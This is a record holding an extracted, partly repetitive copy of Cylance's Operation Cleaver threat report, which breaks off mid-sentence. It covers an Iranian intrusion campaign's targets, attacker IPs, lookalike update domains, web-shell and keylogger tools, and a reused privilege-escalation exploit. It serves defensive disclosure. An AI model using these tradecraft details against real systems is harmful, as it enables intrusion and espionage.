{
    "id": "185fe457-d462-4f90-aa25-3454032ab936",
    "created_at": "2022-10-25T16:48:12.043873Z",
    "updated_at": "2025-03-27T02:16:11.494302Z",
    "deleted_at": null,
    "sha1_hash": "eab03ae476c002161e00411d136b311a6b434745",
    "title": "",
    "authors": "",
    "file_creation_date": "2014-12-02T04:25:03Z",
    "file_modification_date": "2014-12-02T04:25:12Z",
    "file_size": 8835748,
    "plain_text": "###### 7\n\n\n###### #OPCLEAVER\n\n\n-----\n\n##### CLEAVER\n\n\n###### “Iran should be considered a first-tier cyber power.”\n\n\n###### Gabi Siboni\nIsrael Institute for National Security Studies cybersecurity expert\n\n###### “Iran has rapidly gained near parity with the Chinese but may be closer to the Russians in terms of swagger.”\n\n\n###### Retired Admiral William J. Fallon\nFormer Commander CENTCOM\n\n###### “Global critical infrastructure organizations need to take this threat seriously. The Iranian adversary is real and they’re coming, if not already here.”\n\n\n###### Mark Weatherford\nFormer Deputy Under Secretary for Cybersecurity at the US Department of Homeland Security\n\n###### “Yes, China and one or two others can shut down our power grids.”\n\n\n###### Admiral Michael Rogers\nDirector of the National Security Agency and head of US Cyber Command\n\n###### “The world has combated cyber threats by doing the same thing over and over again … It’s the definition of insanity.”\n\n\n###### Jeff Moss\nCo-Chair DHS Community Resiliency Task Force, Founder of DEFCON and BlackHat\n\n###### Jalal ad-Din Muhammad Rumi\n13[th] Century Persian poet, jurist, theologian and Sufi mystic\nEnglish translation: “Silence gives answers.”\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### PREVENTION IS EVERYTHING\n\nA personal note from Cylance, CEO Stuart McClure\n\nn February 24, 1989, United Flight 811 left Honolulu, Hawaii, on its way to Auckland, New Zealand, with\n364 souls on board. Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine\npassengers into the dark void over the Pacific Ocean.[1] This aviation disaster was later determined to have\nbeen caused by a simple design flaw combined with the lack of corrective action. Boeing and the FAA had\n\n# Oknown about this problem for over one year prior to the accident. The result: nine people lost their lives. The other 337\n\npassengers plus 18 crew members who survived, live with the memory every day; all of it due to a highly preventable\ndesign flaw. As a 19-year-old young adult, I was grateful to have survived but I had no idea how that single event would\nimpact my future in such a profound way. Much of my passion for cybersecurity can be directly attributed to that\n**fateful day.**\n\nThe United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes. Preventable\ndisasters like this are what motivates the Cylance team to create a safer world. We do everything we can to uncover\n\n###### 7\n\nthe flaws in technologies before they damage the physical or cyber world. Our mission is simple: to protect the world.\nThis report is an attempt to deliver on that mission.\n\n**After tracking hackers both personally and professionally for more than 26 years, there is no doubt in my mind**\n**that the release of the information contained in the Operation Cleaver report is vital to the security of the world’s**\n**critical infrastructure.**\n\n\ndisasters like this are what motivates the Cylance team to create a safer world. We do everything we can to uncover\n\n\nThe focus of the Operation Cleaver report is on one particular Iranian team we’ve dubbed Tarh Andishan, the\ninfrastructure they utilize, as well as their tactics, techniques and procedures. Roughly translated, “Tarh Andishan”\nmeans “thinkers” or “innovators”. This team displays an evolved skillset and uses a complex infrastructure to perform\nattacks of espionage, theft, and the potential destruction of control systems and networks. While our investigation is\nongoing, and we presently have limited visibility inside many of the compromised networks, Cylance observed Tarh\nAndishan actively targeting, attacking, and compromising more than 50 victims since at least 2012.\n\nCylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this\nreport, limiting our content to only that which can be definitively confirmed. However, we have speculated on the\npossible motivations behind these attacks, given our deep knowledge and understanding of the cyber landscape.\n**We have made every effort to notify all affected entities prior to publishing this report. Additionally, all personally**\nidentifiable information about the members of Operation Cleaver has been withheld. We don’t care who the adversary\nis, where they work or reside, who they’re dating or what party photos they upload to Facebook – all we care about is\npreventing campaigns like Operation Cleaver from negatively affecting the real world.\n\n\nSincerely,\n\n\n-----\n\n##### CLEAVER\n\n\n##### TABLE OF CONTENTS\n\n###### Executive Summary ......................................................................... Background ........................................................................................ Why the name “Cleaver”? ............................................................. Why Expose Iran Now? .................................................................. Critical Discoveries ......................................................................... Targets & Victims ............................................................................ Attribution ......................................................................................... Attacker IP Addresses .............................................................. Attacker Domains ...................................................................... Tools & Software ........................................................................ Tarh Andishan ............................................................................ Members ......................................................................................   Teams ............................................................................................ Tactics, Techniques & Procedures (TTPs) ............................... Initial Compromise ..................................................................... Privilege Escalation & Pivoting ............................................... Exfiltration .................................................................................... Persistence .................................................................................. Mitigation .......................................................................................... Speculation: The Why ................................................................... Conclusion ........................................................................................ References ........................................................................................ About Cylance ................................................................................. Cylance Products ........................................................................... Cylance Services ............................................................................ Acknowledgments ...................................................................... The Operation Cleaver Logo ...................................................... Appendix A: Indicators of Compromise (IOC) ........................\n\n\n###### 5 6 8 8 9 12 17 18 19 20 24 26 30 31 32 36 41 47 60 62 65 67 68 69 70 71 72 73\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### EXECUTIVE SUMMARY\n\n###### Since at least 2012, Iranian actors have directly attacked, established persistence in, and extracted highly sensitive materials from the networks of government agencies and major critical infrastructure companies in the following countries: Canada, China, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea, Turkey, United Arab Emirates, and the United States.\n 7\n Iran is the new China.\n\n\nOperation Cleaver has, over the past several years, conducted a significant global surveillance\nand infiltration campaign. To date it has successfully evaded detection by existing security\ntechnologies. The group is believed to work from Tehran, Iran, although auxiliary team\nmembers were identified in other locations including the Netherlands, Canada, and the UK.\nThe group successfully leveraged both publicly available, and customized tools to attack and\ncompromise targets around the globe. The targets include military, oil and gas, energy and\nutilities, transportation, airlines, airports, hospitals, telecommunications, technology, education,\naerospace, Defense Industrial Base (DIB), chemical companies, and governments.\n\nDuring intense intelligence gathering over the last 24 months, we observed the technical\ncapabilities of the Operation Cleaver team rapidly evolve faster than any previously observed\nIranian effort. As Iran’s cyber warfare capabilities continue to morph,[2] the probability of an attack\nthat could impact the physical world at a national or global level is rapidly increasing.[3] Their\ncapabilities have advanced beyond simple website defacements, Distributed Denial of Service\n(DDoS) attacks, and Hacking Exposed style techniques.\n\n\nWith minimal separation between private companies and the Iranian government, their modus\noperandi seems clear: blur the line between legitimate engineering companies and statesponsored cyber hacking teams to establish a foothold in the world’s critical infrastructure.\n\nIran’s rising expertise, along with their choice of victims, has compelled us to release this report\nsooner than we would have liked in order to expose Operation Cleaver to the world. The\nevidence and indicators of compromise we provide in this report will allow potentially unaware\nvictims to detect and eliminate Cleaver’s incursions into their networks.\n\n\n-----\n\n##### CLEAVER\n\n\n### BACKGROUND\n\n###### Iran has been severely impacted by debilitating and extremely advanced malware campaigns since at least 2009. Famous examples of these efforts include industrial sabotage via Stuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011) as well as Flame (2012). These campaigns have targeted Iran’s nuclear program, and oil and gas operations. Stuxnet was an eye-opening event for Iranian authorities, exposing them to the world of physical destruction via electronic means.\n\n\nHacking campaigns sourced out of Iran are nothing new. Since the early 2000’s, the information\nsecurity industry as a whole has tracked teams like the Iranian Cyber Army, which mainly focuses\non patriotic hacking (website defacements). After the release of Stuxnet, Iran’s motivations appear\nto have shifted. Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the\ncertificate compromises of Comodo and DigiNotar. These attacks served as a warning, showcasing\nthe rapid evolution of Iran’s hacking skills.\n\nA major retaliation came in the form of 2012’s Shamoon campaign, which impacted RasGas and\nSaudi Aramco. It’s estimated that Shamoon impacted over 30,000 computer endpoints and cost\nthe affected companies tens-of-thousands of hours recovering from the attacks. The direct financial\nimpact from this retaliation and amount of downtime experienced were staggering. Shamoon was\ntruly a watershed event for security defenders. It was the first glimpse into the real capabillity and\nintention of Iranian cyber operations. We see the same motivation and intent here in Operation\n**Cleaver: establishing a beachhead for cyber sabotage.**\n\n\nWe saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil’s\nDistributed Denial of Service (DDoS) attacks against US banks. These attacks were debilitating and\nimpacted the availability of online banking services. Yet more backlash was witnessed with FireEye’s\nexposure of Operation Saffron Rose, an espionage campaign executed by the Ajax Security Team\nin 2014. In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social\nmedia, dubbed Operation Newscaster, which was uncovered by iSight Partners.\n\nIn June 2013, Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out “non-stop”\nattacks on “[Israel’s] vital national systems” including “water, power and banking”[4]. The following\nSeptember of 2013, the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy\ncomputers in San Diego’s NMCI (Navy Marine Corp Intranet),[5] which we can confirm was part of\nOperation Cleaver.\n\n\n-----\n\n###### #OPCLEAVER\n\n\nWhile previously reported operations attributed to Iran have largely focused on Defense Industrial\nBase (DIB) companies, the United States Federal Government, or targets in Middle Eastern countries,\nOperation Cleaver has instead focused on a wide array of targets, including energy producers\nand utilities, commercial airlines and airports, military intelligence, aerospace, hospitals, and\neven universities – with only ten of the targets based in the United States. Such broad targeting\ndemonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone.\nThey have bigger intentions: to position themselves to impact critical infrastructure globally.\n\n\n-----\n\n##### CLEAVER\n\n\n##### WHY THE NAME CLEAVER?\n\nThe string cleaver is found several times in a variety of custom software used in Operation\nCleaver, including:\n\n\n###### 1\n\n 2\n\n\n###### 3\n\n\nNumerous references inside the namespaces of their custom bot code\ncodenamed TinyZBot, e.g.:\n```\ne:\\projects\\cleaver\\trunk\\zhoupin_cleaver\\obj\\x86\\release\\netscp.pdb\n\n```\nPDBs associated with the hacker name “Jimbp”, e.g.:\n```\nc:\\users\\jimbp\\desktop\\binder_1 - for cleaver\\binder_1\\obj\\x86\\release\\setup.pdb\n\n```\nPDBs associated with the keystroke loggers, artifacts, and numerous other tools, e.g.:\n```\ne:\\Projects\\Cleaver\\trunk\\MainModule\\obj\\Release\\MainModule.pdb\n\n```\n\n##### WHY EXPOSE IRAN NOW?\n\nWe believe our visibility into this campaign represents only a fraction of Operation Cleaver’s full\nscope. We believe that if the operation is left to continue unabated, it is only a matter of time\nbefore the world’s physical safety is impacted by it. While the disclosure of this information will\nbe a detriment to our ability to track the activity of this group, it will allow the security industry as\na whole to defend against this threat. As such, we are exposing this cyber campaign early in an\nattempt to minimize additional real-world impact and prevent further victimization.\n\n\n-----\n\n## CRITICAL DISCOVERIES\n\n###### 7\n\n\n###### #OPCLEAVER\n\n\n-----\n\n##### CLEAVER\n\n\n##### CRITICAL DISCOVERIES\n\n###### Iranian Actors Are Behind Operation Cleaver\n\n\n\n- Persian hacker names are used throughout the campaign including: Salman Ghazikhani,\nBahman Mohebbi, Kaj, Parviz, Alireza, and numerous others.\n\n- Numerous domains used in the campaign were registered in Iran.\n\n- Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh\nAndishan, which translates to “invention” or “innovation” in Farsi.\n\n- Source netblocks and ASNs are registered to Iran.\n\n- Hacker tools warn when their external IP address traces back to Iran.\n\n- The infrastructure is hosted through Netafraz.com, an Iranian provider out of Isfahan, Iran.\n\n- The infrastructure utilized in the campaign is too significant to be a lone individual or a small\ngroup. We believe this work was sponsored by Iran.\n\n###### Operation Cleaver Targets Critical Infrastructure Around the World\n\n\n\n- US Military targets including NMCI in October 2013.[5] Confirmed targeting of global\ngovernment entities.\n\n- Networks and systems targeted in critical industries like energy and utilities, oil and gas, and\nchemical companies.\n\n- Assets (both cyber and physical) and logistics information were compromised at major airline\noperators, airports, and transportation companies.\n\n- Various global telecommunications, technology, healthcare, aerospace, and defense\ncompanies were breached as part of the operation.\n\n- Confidential critical infrastructure documents were harvested from major educational\ninstitutions around the world.\n\n###### Iran’s Cyber Hacking Skills Have Evolved\n\n\n\n- Initial compromise techniques include SQL injection, web attacks, and creative deceptionbased attacks – all of which have been implemented in the past by Chinese and Russian\nhacking teams.\n\n- Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and\nWindows privilege escalations, and were coupled with automated, worm-like propagation\nmechanisms.\n\n- Customized private tools with functions that include ARP poisoning, encryption, credential\ndumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and\nSMB communications, network interface sniffing, and keystroke logging.\n\n- The ability to build customized tools to compromise any target they choose.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Indicators of Compromise (IOC)\n\n- Private signing certificates of one victim were captured allowing the Operation Cleaver team to\ncompromise the entirety of their organization.\n\n- Over the past two years, Cylance has collected over 8GB of data including over 80,000 files of\nexfiltrated data, hacker tools, victim logs, and highly sensitive reconnaissance data.\n\n- Data from sinkholed command and control servers has allowed us to track this active campaign.\n\n- Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to\nempower the security community to detect existing compromises in their own organizations, as\nwell as potentially block future attacks from these teams.\n\n\n###### Speculation\n 7\n\n- This campaign continues Iran’s retaliation for Stuxnet, Duqu, and Flame.\n\n- This is a state-sponsored campaign.\n\n- There is a possibility that this campaign could affect airline passenger safety.\n\n- This campaign’s intentions may be to damage Industrial Control Systems (ICS), Supervisory\nControl and Data Acquisition (SCADA) systems, and impact Critical Infrastructure and Key\nResources (CIKR).\n\n- This campaign could be a way to demonstrate Iran’s cyber capabilities for additional\ngeopolitical leverage, due to the breadth and depth of their global targets.\n\n- There is an intense focus on CIKR companies in South Korea, which could give Iran additional\nclout in their burgeoning partnership with North Korea. In September 2012, Iran signed an\nextensive agreement for technology cooperation agreement with North Korea, which would\nallow for collaboration on various efforts including IT and security.[6]\n\n- Iran is recruiting from within the universities and potentially using ‘hackers for hire’.[7]\n\n\n-----\n\n## TARGETS & VICTIMS\n\n###### 7\n\n\n###### #OPCLEAVER\n\n\n-----\n\n###### #OPCLEAVER\n\n\n##### TARGETS & VICTIMS\n\nThe Cleaver team targets some of the most sensitive global critical infrastructure companies in the\nworld, including military, oil and gas, airlines, airports, energy producers, utilities, transportation,\nhealthcare, telecommunications, technology, manufacturing, education, aerospace, Defense\nIndustrial Base (DIB), chemical companies and governments. Countries impacted include Canada,\nChina, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South\nKorea, Turkey, United Arab Emirates, and the US.\n\n\nThe Cleaver team targets some of the most sensitive global critical infrastructure companies in the\nworld, including military, oil and gas, airlines, airports, energy producers, utilities, transportation,\nhealthcare, telecommunications, technology, manufacturing, education, aerospace, Defense\nIndustrial Base (DIB), chemical companies and governments. Countries impacted include Canada,\nChina, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South\nKorea, Turkey, United Arab Emirates, and the US.\n\nThe following is a breakdown by country of which industries were targeted and/or victimized:\n\n###### Canada Kuwait South Korea\n\n          - Energy & Utilities           - Oil & Gas           - Airports\n\n###### 7\n\n          - Oil & Gas          - Telecommunications          - Airlines\n\n          - Hospitals          - Education\n\n                                  - Technology\n\n###### Mexico\n China - Oil & Gas - Heavy Manufacturing\n\n         - Aerospace\n\n###### Turkey\n Pakistan\n\n                                     - Oil & Gas\n\n###### England - Airports\n\n         - Education          - Hospitals\n\n                     - Technology **United Arab Emirates**\n\n                         - Airlines                          - Government\n\n###### France\n\n                                         - Airlines\n\n          - Oil & Gas\n\n###### Qatar\n\n                       - Oil & Gas\n\n###### Germany United States\n\n                   - Government\n\n         - Telecommunications         - Airlines\n\n                         - Airlines\n\n                                   - Education\n\n###### India - Chemicals\n\n         - Education **Saudi Arabia**          - Transportation\n\n                       - Oil & Gas                       - Energy & Utilities\n\n                        - Airports                         - Military/Government\n\n###### Israel\n\n                                    - Defense Industrial Base\n\n         - Aerospace\n\n         - Education\n\n\n-----\n\n##### CLEAVER\n\n\nCleaver’s level of access into each organization varied greatly, including completely compromised\nsystems and networks, Active Directory domain controllers and credentials, compromised data\nrepositories and stolen VPN credentials.\n\nCompromised systems include Microsoft Windows web servers running IIS and ColdFusion,\nApache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers.\nCompromised network infrastructure included Cisco VPNs as well as Cisco switches and routers.\nUnlike Stuxnet, no exotic exploitations (such as 0-days) were observed.\n\n\nWithin our investigation, we had no direct evidence of a successful compromise of specific\nIndustrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but\nCleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing\nthem to directly affect the systems they run. This data could enable them, or affiliated organizations,\nto target and potentially sabotage ICS and SCADA environments with ease.\n\nWe discovered over 50 victims in our investigation, distributed around the globe. Ten of these\nvictims are headquartered in the US and include a major airline, a medical university, an energy\ncompany specializing in natural gas production, an automobile manufacturer, a large defense\ncontractor, and a major military installation. The four targets in Israel and the five targets in Pakistan\nare comprised of education, aerospace, airports, airlines, healthcare and technology. Further victims\nwere identified in numerous Middle Eastern countries as well as ones in Northern Europe including\nthe UK, France, and Germany. Central America was not immune either with a large oil and gas\ncompany on the list. In fact, oil and gas was a particular focal point for the Cleaver team, going after\nno less than nine of these companies around the world.\n\n\nUniversities were targeted in the US, India, Israel, and South Korea. The attackers targeted research\nefforts, student information, student housing, and financial aid systems. They had a penchant for\npictures, passports, and any specifc identifying information.\n\nPerhaps the most bone-chilling evidence we collected in this campaign was the targeting and\ncompromise of transportation networks and systems such as airlines and airports in South Korea,\nSaudi Arabia and Pakistan. The level of access seemed ubiquitous: Active Directory domains\nwere fully compromised, along with entire Cisco Edge switches, routers, and internal networking\ninfrastructure. Fully compromised VPN credentials meant their entire remote access infrastructure\nand supply chain was under the control of the Cleaver team, allowing permanent persistence\nunder compromised credentials. They achieved complete access to airport gates and their security\ncontrol systems, potentially allowing them to spoof gate credentials. They gained access to PayPal\nand Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered\naccess to the victim’s domains. We were witnessed a shocking amount of access into the deepest\nparts of these companies and the airports in which they operate.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n8\n\n9\n\n12 16\n\n10\n\n\n25\n\n14\n\n18\n\n\n32\n\n\n31\n\n31\n\n\n**Figure 2: Geographic distribution of victims, as determined by the global headquarters of the parent**\ni ti b h d\n\n\nB\n\n\n-----\n\n##### CLEAVER\n\n\n**Figure 3: Number of Cleaver victims by the level of access obtained as well as the level of critical impact potential.**\n\n\n-----\n\n## ATTRIBUTION\n\n###### 7\n\n\n###### #OPCLEAVER\n\n\n-----\n\n##### CLEAVER\n\n\n##### ATTRIBUTION\n\nDespite today’s trend toward attacker attribution, we believe\nit offers little real benefit to the day-to-day cyber defender.\nHowever, in this report we offer our observations on the\nsources of Operation Cleaver in order to benefit those that\nrely on attribution such as Law Enforcement.\n\n\nOperation Cleaver is believed to consist of at least 20\nhackers and developers, collaborating on projects and\nmissions to support Iranian interests. Many of the targets were\npredominately English-speaking and a majority of the team\nmembers were capable of reading and writing in English. We\npresent evidence that this team is operating, at least in part,\nout of Iran and in the interests of Iran. The skills and behavior\nof the Operation Cleaver teams are consistent with, and in\none case surpasses, Iran’s cyber capabilities as we know\nthem today.\n\nFor a complete list of IPs and domains related to this\ncampaign, please refer to the Indicators of Compromise\nsection.\n\n\n**Figure 4: The logo of the Army of the**\nGuardians of the Islamic Revolution,\nalso known as the Islamic Revolutionary\nGuard Corps (IRGC).\n\n\n###### ATTACKER IP ADDRESSES\n\nOver the course of multiple incident response engagements related to Operation Cleaver, we\nwere able to identify a small set of IP addresses which were commonly used during the initial\nstages of an attack.\n\n\nThe IP address 78.109.194.114 served as a source for one of the primary attackers.\nThey were observed conducting SQL injections, controlling backdoors, as well as exfiltrating\ninformation using this address, and the address appears in multiple software configurations\nrecovered from staging servers over a period of time.\n```\n    GeoIP Location: Iran\n    Net block: 78.109.194.96 - 78.109.194.127\n    Owner: Tarh Andishan\n    Email: tarh.andishan(at)yahoo.com\n    Phone: +98-21-22496658\n    NIC-Handle: TAR1973-RIPE\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\nThis IP address was also observed in multiple software configurations. This particular net block\nwas used over an extended period of time, indicating these were under the Cleaver team’s\nphysical control. Additionally, prior netblocks used by the same team demonstrated to us that\nthis wasn’t simply a case of proxying or “island hopping”. For more information see the Tarh\n**Andishan section of this report.**\n\nThe IP address 159.253.144.209 was a source for a secondary attacker in various\ncompromises. They were observed conducting SQL injection attacks. While this IP was this\nregistered in the Netherlands, we believe they used Softlayer’s Citrix demo environment to\nlaunch these attacks which is consistent with proxying or “island hopping”.\n\n```\n    GeoIP Location: Netherlands\n    Net block: 159.253.144.208 - 159.253.144.223\n    ASN: Softlayer Technologies, Inc.\n    IP Location: Netherlands, Amsterdam with Iranian sourcing.\n\n###### 7\n\n ATTACKER DOMAINS\n\n```\nA number of Cleaver’s attack methods require a persistent server. In many cases, these servers\nwere referenced by domain names. The following malicious domains are operated by this\norganization and are grouped by the registrant’s email address.\n\n\ndavejsmith200(at)outlook.com\n\n- Teledyne-Jobs.com\n\n- DownloadsServers.com\n\n- NorthropGrumman.net\n\n- MicrosoftMiddleAst.com\n\n\nazlinux73(at)gmail.com\n\n-  MicrosoftServerUpdate.com\n\n-  WindowsSecurityUpdate.com\n\n-  WindowsServerUpdate.com\n\n\ndomain(at)netafraz.com\n\nsalman.ghazikhani(at)outlook.com  -  EasyResumeCreatorPro.com\n\n- Doosan-Job.com -  MicrosoftWindowsResources.com\n\n\nbtr.8624(at)yahoo.com\n\n- GoogleProductUpdate.net\n\n- WindowsCentralUpdate.com\n\n- WindowsUpdateServer.com\n\n- DriverCenterUpdate.com\n\n\nmsnhst(at)microsoft.com\n\n-  MicrosoftWindowsUpdate.net\n\n\nAs is typical with malicious domains, the Whois data for most of these domains contained falsified\ninformation.\n\nWe managed to obtain a large collection of the internally developed tools used by the Cleaver\nteam, many of which were developed by its members. Due to operational security failures, these\ntools contain information that provided us insight into their organization and operations.\n\n\n-----\n\n##### CLEAVER\n\n\n###### TOOLS & SOFTWARE\n\n Shell Creator 2\n\n\nIn the tool named Shell Creator 2, there are three main components. The creator generates\nan ASPX web shell using user input as well as a collection of templates. The web shell could\nthen be installed via xp_cmdshell, or any other method which would grant the attacker write\naccess. The web shell is accessible by the shell client directly.\n\nThe shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised\ncomputer. We originally located it on a staging server being utilized for multiple attacks as well as\na tool for sharing data between members of the organization’s team.\n\n\nThe shell client, which is developed in Java and is easily decompiled, is a simple interface with\na feature to protect the operator from making a critical mistake. When executed, and before\nany connection to an instance of the web shell is initiated, the shell client communicates with\n```\nfreegeoip.net in order to get the external IP address of the current user. The country of origin\n\n```\nis then shown to the user, to inform them of what country it appears they are connecting from.\nThe assumed purpose of this feature is to ensure that a proper proxy is in use, and the real origin\nof the attacker is not revealed.\n\nAfter decompiling the shell client, we found the following code segment controlling the display of\nthis IP location information.\n\n\nThis code handles the XML response from freegeoip.net, and displays the information\nas different colors based on different attributes. For instance, if the string “ERROR” is in the\nresponse, the text is displayed with the color magenta. If the string IRAN is in the response, the\ntext is displayed with the color red. It should be noted that no other country name contains the\nsubstring IRAN.\n\n\nIn the tool named Shell Creator 2, there are three main components. The creator generates\nan ASPX web shell using user input as well as a collection of templates. The web shell could\nthen be installed via xp_cmdshell, or any other method which would grant the attacker write\naccess. The web shell is accessible by the shell client directly.\n\nThe shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised\ncomputer. We originally located it on a staging server being utilized for multiple attacks as well as\na tool for sharing data between members of the organization’s team.\n\nThe shell client, which is developed in Java and is easily decompiled, is a simple interface with\na feature to protect the operator from making a critical mistake. When executed, and before\nany connection to an instance of the web shell is initiated, the shell client communicates with\n```\nfreegeoip.net in order to get the external IP address of the current user. The country of origin\n\n```\nis then shown to the user, to inform them of what country it appears they are connecting from.\nThe assumed purpose of this feature is to ensure that a proper proxy is in use, and the real origin\nof the attacker is not revealed.\n\nAfter decompiling the shell client, we found the following code segment controlling the display of\nthis IP location information.\n\n**Figure 5: Java source code showing how Shell Creator 2 distinguishes between a source IP address**\ncoming from Iran (red) versus any other country (green).\n\nThis code handles the XML response from freegeoip.net, and displays the information\nas different colors based on different attributes. For instance, if the string “ERROR” is in the\nresponse, the text is displayed with the color magenta. If the string IRAN is in the response, the\ntext is displayed with the color red. It should be noted that no other country name contains the\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### CLEAVER\n\n Shell Creator 2 (cont.)\n\n**Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.**\n\n###### 7\n\n\n**Figure 9: Updated ASCII art found in Net**\n\n\n-----\n\n##### CLEAVER\n\n\n###### TinyZBot\n\nTinyZBot is a bot written in C# and developed by the Cleaver team. It is the longest developed\nmalware family discovered by this group, and has been used in campaigns for close to two\nyears. How it operates can vary greatly from version to version. For a detailed technical analysis\nof TinyZBot, see the Tactics, Techniques and Procedures section. As TinyZBot is developed in\nC#, many versions can be decompiled to code very similar to their originals, including names\nof namespaces. Many versions were obfuscated with a legitimate tool for developers named\nSmartAssembly, which makes the recovery of some names implausible.\n\n\nWe obtained multiple versions from which we were able to recover many of the original names of\nvariables and namespaces. In a number of these samples, the primary namespace for TinyZBot\nis named Zhoupin_Cleaver. In every version of TinyZBot that is not obfuscated, there is a\ncode base referred to as Cleaver. This code base is also shared in other malware developed by\nthis organization, such as Csext.\n\n###### PrivEsc\n\n\nPrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January\n2010 called MS10-015, “Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege”,\npopularly known as the KiTrap0D exploit which was released publicly. The Cleaver team clearly\nmodified the source code and compiled a new version. The only detectable modification was to\nchange the original author’s name to instead display the following:\n```\n               Zhopin Exploit Team\n\n```\n\nThis is not the only case of this team relabeling others’ work as their own.\n\n###### Logger Module\n\n\nLogger module is a component of the PVZ (PVZ is shorthand for Parviz, one of the members of\nthe Cleaver team) bot tool chain. When executed, it will capture the user’s keystrokes and save\nthem to a location which PVZ bot then exfiltrates. The logger module binary’s file description\nvalue is the following:\n\nye file khube DG. ba in ham kari nadashte bashin\n\n\nRoughly translated from Persian, this text says:\n\nDG is a good file, don’t bother with this\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Logger Module (cont.)\n\nThis text could potentially be a note intended to stay internal, or could be an attempt to persuade\nan unsuspecting victim to assume the file is not malicious. The Product Name value is GOOD FILE.\nFor more information on the PVZ bot tool chain, see the Tactics, Techniques, and Procedures\nsection.\n\n\n###### CCProxy\n\nCCProxy is a publicly available proxy server for Windows, which can handle a variety of protocols.\nWe do not believe that this organization was involved in the development or modification of\nCCProxy, but they have been observed using it. We recovered a CCProxy configuration, which\nexposed various operational details.\n\n###### 7\n\nThe configuration allowed for remote\nconnections, limited by a username as well as a\nlimited IP range. The username was User-001,\nwhich is the default value. The limited IP range\ncovered one IP: 78.109.194.114.\n\nThis IP address is located in Iran, and is owned by\nTarh Andishan.\n\nThe configuration also indicates which address\nthe CCProxy server should listen on for incoming\nconnections such as web (80) and mail (25).\n\n**Figure 10 (above): CCProxy configuration file**\nusing the hardcoded IP address registered to Tarh\nAndishan.\n\n**Figure 11 (left): CCProxy configuration file showing the**\nuse of web and mail as listening ports.\n\n\n-----\n\n##### CLEAVER\n\n\n###### NMAP Log\n\nLog output from the network port scanning application NMAP was recovered from a staging\nserver. This log was generated during the usage of the nbrute utility, which brute-forces network\ncredentials and relies on NMAP to do so. The header of this NMAP log indicates that the computer\nused to run nbrute/nmap was set to Iran Daylight Time at the time of execution.\n\n\nStarting Nmap 6.25 at 2012-08-17 09:18 Iran Daylight Time\n\nWith no known victims located in Iran, it is likely that this was executed on an attacker’s computer,\nand not on a victim’s computer.\n\n\n###### Squid Configuration\n\nA configuration file for a Squid proxy server was recovered.\n\n\n**Figure 12: Squid configuration file showing the use of Tarh Andishan’s IP address.**\n\nThe net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC\ncomment appended in order to make it look like it was part of the default configuration. It is likely\nthis is the same reason a /28 net range was used, in order to not look like it was intended to only\nallow one IP. This would give the same access to resources accessible from the Squid proxy server\nto this Iranian IP address.\n\n\n###### TARH ANDISHAN\n\nTarh Andishan is listed as the registrant for a number of small net blocks based upon the email\naddress tarh.andishan(at)yahoo.com. The net blocks appear to rotate over time and\nregistrant information is altered to accommodate ongoing operations and avoid potential public\nexposure.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### TARH ANDISHAN (cont.)\n\nThe networks are included below as well as the last time that net block was observed as active.\n```\n   • 78.109.194.96/27 - Current\n   • 217.11.17.96/28 - 10/22/2014\n   • 81.90.144.104/29 - 10/5/2014\n   • 31.47.35.0/24 – 11/2012\n\n```\n\nThere are many seemingly legitimate Tarh Andishan related companies inside Tehran, but strong\nconnections to Iranian backing have been difficult to prove definitively. “Tarh Andishan” is often\ntranslated as “Thinkers”, “Innovators” and “Inventors”.\n\nThe net blocks above have strong associations with state-owned oil and gas companies. These\n\n###### 7\n\ncompanies have current and former employees who are ICS experts.\n\nTarh Andishan has been suspected in the past of launching attacks in the interest of Iran. The\noperators of the blog IranRedLine.org, which comments on Iran’s nuclear weapons efforts, has\nmentioned in multiple posts having been the target of debilitating brute-force authentication attacks\nfrom IP addresses registered to the same Tarh Andishan team found in Cleaver.\n\nIn one of IranRedLine.org’s blog posts[8], the author speculates on Tarh Andishan’s involvement\nwith the Iranian government by showing close proximity to SPND, the Organization of Defensive\nInnovation and Research; however, the phone number listed under the registrant contact\ninformation has yet to be completely validated.\n\n\nInnovation and Research; however, the phone number listed under the registrant contact\ninformation has yet to be completely validated.\n\n\n-----\n\n##### CLEAVER\n\n\n###### MEMBERS\n\nDuring this investigation, we were able to compile a considerable amount of information on some of\nthe members of this organization. The following profiles were built from reverse engineering, code\nanalysis, open source intelligence, incident response and forensics work. Personally identifiable\ninformation about these members is not being shared publicly as it could endanger their lives and\nwould be irresponsible.\n\n\n###### Parviz\n\nParviz is a developer who worked on a variety of projects, and was primarily active in 2013. His\ndevelopment skillset is based around his ability to develop in C/C++. He has been 